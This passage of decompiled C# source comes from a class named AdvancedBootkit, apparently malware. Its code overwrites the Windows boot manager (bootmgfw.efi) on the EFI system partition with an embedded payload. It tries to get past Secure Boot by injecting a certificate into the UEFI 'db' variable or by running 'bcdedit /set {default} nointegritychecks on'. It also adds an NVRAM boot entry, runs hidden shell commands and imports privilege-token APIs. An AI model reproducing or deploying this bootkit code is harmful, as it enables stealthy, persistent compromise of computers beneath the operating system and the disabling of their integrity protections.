	private static byte[] GetEmbeddedResource(string resourceName)
	{
		try
		{
			using Stream stream = typeof(AdvancedBootkit).Assembly.GetManifestResourceStream(resourceName);
			if (stream == null)
			{
				return null;
			}
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			return array;
		}
		catch
		{
			return null;
		}
	}

	private static void AttemptSecureBootBypass()
	{
		try
		{
			byte[] embeddedResource = GetEmbeddedResource("Client.Helper.my_cert.cer");
			if (embeddedResource != null)
			{
				string lpGuid = "{d719b2cb-3d3a-4596-a3bc-dad00e676f56f}";
				if (SetFirmwareEnvironmentVariableW("db", lpGuid, Marshal.UnsafeAddrOfPinnedArrayElement(embeddedResource, 0), (uint)embeddedResource.Length) != 0)
				{
					return;
				}
			}
			ExecuteCommand("bcdedit /set {default} nointegritychecks on");
		}
		catch (Exception)
		{
		}
	}

	private static void InstallGPTUEFIStager()
	{
		try
		{
			string text = FindAndMountESP();
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			string text2 = Path.Combine(text, "EFI", "Microsoft", "Boot");
			string text3 = Path.Combine(text2, "bootmgfw.efi");
			byte[] embeddedPayload = GetEmbeddedPayload();
			if (embeddedPayload == null || embeddedPayload.Length < 30000)
			{
				UnmountESP(text);
				return;
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			if (File.Exists(text3))
			{
				File.Copy(text3, text3 + ".bak2026", overwrite: true);
			}
			File.WriteAllBytes(text3, embeddedPayload);
			if (IsSecureBootEnabledAndEnforced())
			{
				AttemptSecureBootBypass();
			}
			UnmountESP(text);
		}
		catch (Exception)
		{
		}
	}

	private static void AddBootEntryToNVRAM(string efiPathOnESP)
	{
		try
		{
			string lpGuid = "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}";
			byte[] bytes = Encoding.Unicode.GetBytes(efiPathOnESP);
			SetFirmwareEnvironmentVariableW("Boot0001", lpGuid, Marshal.UnsafeAddrOfPinnedArrayElement(bytes, 0), (uint)bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	private static string GetSystemBootPhysicalDisk()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive WHERE Index = 0");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						string text = ((ManagementBaseObject)(ManagementObject)enumerator.Current)["DeviceID"]?.ToString();
						if (!string.IsNullOrEmpty(text))
						{
							return text.StartsWith("\\\\.\\") ? text : ("\\\\.\\" + text);
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			DriveInfo drive = new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory).TrimEnd(new char[1] { '\\' }));
			return $"\\\\.\\PhysicalDrive{GetPhysicalDiskNumber(drive)}";
		}
		catch
		{
			return null;
		}
	}

	private static int GetPhysicalDiskNumber(DriveInfo drive)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("ASSOCIATORS OF {Win32_LogicalDisk.DeviceID='" + drive.Name.TrimEnd(new char[1] { '\\' }) + "'} WHERE AssocClass=Win32_LogicalDiskToPartition");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.Current;
						ManagementObject val3 = ((IEnumerable)new ManagementObjectSearcher(string.Format("ASSOCIATORS OF {{Win32_DiskPartition.DeviceID='{0}'}} WHERE AssocClass=Win32_DiskDriveToDiskPartition", ((ManagementBaseObject)val2)["DeviceID"])).Get()).Cast<ManagementObject>().FirstOrDefault();
						if (val3 != null)
						{
							return Convert.ToInt32(((ManagementBaseObject)val3)["DiskIndex"] ?? ((ManagementBaseObject)val3)["Index"]);
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return 0;
	}

	private static void ExecuteCommand(string command)
	{
		try
		{
			Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				WindowStyle = ProcessWindowStyle.Hidden
			})?.WaitForExit();
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

	[DllImport("ntdll.dll")]
	private static extern int NtUnloadDriver(ref UNICODE_STRING DriverName);

	[DllImport("ntdll.dll")]
	private static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern uint GetFirmwareEnvironmentVariableW(string lpName, string lpGuid, IntPtr pBuffer, uint nSize);
}
